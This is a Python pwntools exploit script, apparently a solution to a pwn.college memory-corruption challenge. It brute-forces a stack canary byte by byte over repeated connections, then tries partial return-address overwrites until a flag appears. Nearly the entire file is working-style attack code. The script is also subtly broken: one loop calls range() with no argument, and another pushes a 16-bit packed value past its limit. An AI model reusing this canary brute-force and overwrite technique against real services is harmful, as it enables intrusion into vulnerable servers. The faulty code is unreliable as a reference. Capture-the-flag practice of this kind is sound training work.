from pwn import *

context.arch = 'amd64'
host = 'localhost' 
port = 1337  

# 连接到服务
def connect():
    return remote(host, port)

# 尝试一个字节，看看程序是否崩溃
def try_byte(p, payload):
    p.sendlineafter('Payload size: ', str(len(payload)).encode() )
    p.send(payload)
    
    try:
        response = p.recvall(timeout=0.15)# not recv but recvall!
        if b'smash' in response :# timeout may can  be smaller 
            return False
        return True
    except EOFError:
        return False

# 爆破金丝雀
def brute_force_canary():
    canary = b'\x00'  # 已知最高位字节是0
    for i in range(1, 8):
        #found = False
        for byte in range():
            p = connect()
            payload = b'A' * 24 + canary + bytes([byte])
            print(payload)
            if try_byte(p, payload):
                canary += bytes([byte])
                #found = True
                print(f"Found byte {i}: {bytes([byte]).hex()}")
                p.close()
                break
            p.close()
    return canary

# 主攻击逻辑
def main():
    s = process('/challenge/babymem_level15.1')
    canary = brute_force_canary()
    print(f"Found canary: {canary.hex()}")
    #pause(10)
    while True:
        for i in range(17):
            p = connect()
            # 发送正确的payload，包括金丝雀和覆盖返回地址
            payload = b'A' * 24 + canary + b'B' * 8
            payload += p16(0x1000*i+0x333)  
            print(payload)
            p.sendlineafter('Payload size: ', str(len(payload)).encode() )
        # p.sendline(str(len(payload)).encode() )
            p.recvuntil('bytes)!')
            p.send(payload)

            re = p.recvall(0.2)
            #print(re)
            if re.find(b'pwn.college{') != -1:
                print(re)
                break

            p.close()

if __name__ == '__main__':
    main()